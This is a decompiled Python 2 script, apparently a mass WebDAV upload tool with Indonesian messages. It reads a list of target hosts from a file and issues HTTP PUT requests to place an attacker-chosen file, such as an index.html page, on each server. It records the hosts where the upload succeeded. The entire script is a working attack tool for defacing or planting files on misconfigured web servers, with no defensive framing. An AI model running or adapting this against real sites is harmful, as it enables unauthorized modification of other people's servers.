# uncompyle6 version 3.7.3
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
# [GCC 8.3.0]
# Embedded file name: webdav.py
import requests, sys, os
if len(sys.argv) != 3:
    print '\n\x1b[33;1m[*]\x1b[0m python2 ' + sys.argv[0] + ' vuln.txt index.html \x1b[33;1m[*]'
    exit(0)
os.system('clear')
target = open(sys.argv[1], 'r')
while True:
    scheker = open(sys.argv[2]).read()
    sukses = open('sucses.txt', 'a')
    host = target.readline().replace('\n', '')
    if not host:
        break
    if not host.startswith('http'):
        host = 'http://' + host
    outname = '/' + sys.argv[2]
    print '\x1b[33;1m[*]\x1b[0m mengirim file  : ' + sys.argv[2]
    print '\x1b[33;1m[*]\x1b[0m ukuran file    : ' + str(len(scheker))
    print '\x1b[33;1m[*]\x1b[0m Target         : ' + host
    try:
        r = requests.request('put', host + outname, data=scheker, headers={'Content-Type': 'application/octet-stream'})
    except:
        print '\x1b[31;1m[-]\x1b[0m Gagal          : Tidak di tanggapi\n'
        continue

    if r.status_code == 200:
        print '\x1b[32;1m[+]\x1b[0m Berhasil        : ' + host + outname + '\n'
        sukses.write(host + outname + '\n')
    else:
        print '\x1b[31;1m[-]\x1b[0m Gagal           : ' + host + outname + '\n'

print '\x1b[34;1m[*]\x1b[0m Output Saved On : gagal.txt'